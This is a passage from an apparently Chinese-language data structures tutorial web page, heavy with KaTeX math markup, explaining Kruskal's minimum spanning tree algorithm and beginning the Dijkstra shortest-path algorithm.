<li>假设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mo>=</mo><mo stretchy="false">(</mo><mi>V</mi><mo separator="true">,</mo><mi>E</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G = (V, E)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">)</span></span></span></span> 是连通图，其最小生成树 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>=</mo><mo stretchy="false">(</mo><mi>U</mi><mo separator="true">,</mo><msub><mi>E</mi><mi>T</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T = (U, E_{T})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li>
<li>初始化：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>=</mo><mi>V</mi><mo separator="true">,</mo><msub><mi>E</mi><mi>T</mi></msub><mo>=</mo><mi mathvariant="normal">∅</mi></mrow><annotation encoding="application/x-tex">U = V, E_{T} = \varnothing</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6633em;vertical-align:-0.0817em;"></span><span class="mord amsrm">∅</span></span></span></span>。即每个顶点构成一棵独立的树，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 此时是一个仅含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>V</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|V|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord">∣</span></span></span></span> 个顶点的森林</li>
<li>循环（重复直至 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 是一棵树）：按 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 的边的权值递增顺序依次从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>−</mo><msub><mi>E</mi><mi>T</mi></msub></mrow><annotation encoding="application/x-tex">E - E_{T}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 中选择一条边，若这条边加入 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 后不构成回路，则将其加入 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mi>T</mi></msub></mrow><annotation encoding="application/x-tex">E_{T}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，否则舍弃，直到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mi>T</mi></msub></mrow><annotation encoding="application/x-tex">E_{T}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 中含有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 条边</li>
</ul>
<p><code>Kruskal</code> 算法的简单实现如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>根据图的相关性质，若一条边连接了两棵不同树中的顶点，则对这两棵树来说，它必定是连通的，将这条边加入森林中，完成两棵树的合并，直到整个森林合并成一棵树。</p>
<p>通常在 <code>Kruskal</code> 算法中，采用 <strong>堆</strong> 来存放边的集合，因此每次选择最小权值的边只需 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mi>E</mi><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log_{2} |E|)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mclose">)</span></span></span></span> 的时间。此外，由于生成树 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 中的所有边可视为一个等价类，因此每次添加新的边的过程类似于求解等价类的过程，由此可以采用并查集的数据结构来描述 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span>，从而构造 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>E</mi><mi mathvariant="normal">∣</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mi>E</mi><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|E| log_{2} |E|)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mclose">)</span></span></span></span>。因此，<code>Kruskal</code> 算法适合于边稀疏而顶点较多的图。</p>
</li>
</ol>
<h4> 最短路径</h4>
<p>广度优先搜索查找最短路径只是对无权图而言的。当图是带权图时，把从一个顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">v_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 到图中其余任意一个顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的一条路径（可能不止一条）所经过边上的权值之和，定义为该路径的 <strong>带权路径长度</strong>，把带权路径长度最短的那条路径称为 <strong>最短路径</strong>。</p>
<p>求解最短路径的算法通常都依赖于一种性质，即两点之间的最短路径也包含了路径上其他顶点间的最短路径。带权有向图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 的最短路径问题一般可分为两类：一是单源最短路径，即求图中某一顶点到其他各顶点的最短路径，可通过经典的 Dijkstra（迪杰斯特拉）算法求解；二是求每对顶点间的最短路径，可通过 Floyd（弗洛伊德）算法来求解。</p>
<ol>
<li>
<p><strong>Dijkstra 算法求单源最短路径问题</strong></p>
<p><code>Dijkstra</code> 算法设置一个集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> 记录己求得的最短路径的顶点，初始时把源点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">v_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 放入 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>，集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> 每并入一个新顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，都要修改源点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">v_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 到集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>−</mo><mi>S</mi></mrow><annotation encoding="application/x-tex">V - S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> 中顶点当前的最短路径长度值。</p>
<p>在构造的过程中还设置了两个辅助数组：</p>
<ul>
<li><strong>dist[]</strong>：记录从源点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">v_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 到其他各顶点当前的最短路径长度，它的初态为：若从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">v_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 有弧，则 <code>dist[i]</code> 为弧上的权值；否则置 <code>dist[i]</code> 为 ∞</li>
<li><strong>path[]</strong>：<code>path[i]</code> 表示从源点到顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 之间的最短路径的前驱结点。在算法结束时，可根据其值追溯得到源点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">v_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 到顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的最短路径</li>
</ul>
<p>假设从顶点 <code>0</code> 出发，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mn>0</mn></msub><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">v_{0} = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>，集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> 最初只包含顶点 <code>0</code>，邻接矩阵 <code>arcs</code> 表示带权有向图，<code>arcs[i][j]</code> 表示有向边 <code>&lt;i, j&gt;</code> 的权值，若不存在有向边 <code>&lt;i, j&gt;</code>，则 <code>arcs[i][j]</code> 为 ∞</p>
<p>Dijkstra 算法的步骤如下（不考虑对 <code>path[]</code> 的操作）：</p>
<ol>
<li>初始化：集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> 初始为 <code>{0}</code>，<code>dist[]</code> 的初始值 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>=</mo><mi>a</mi><mi>r</mi><mi>c</mi><mi>s</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><mi>i</mi><mo>=</mo><mi>l</mi><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>n</mi><mo>−</mo><mi>l</mi></mrow><annotation encoding="application/x-tex">dist[i] = arcs[0][i], i = l, 2, \dotsc, n - l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord 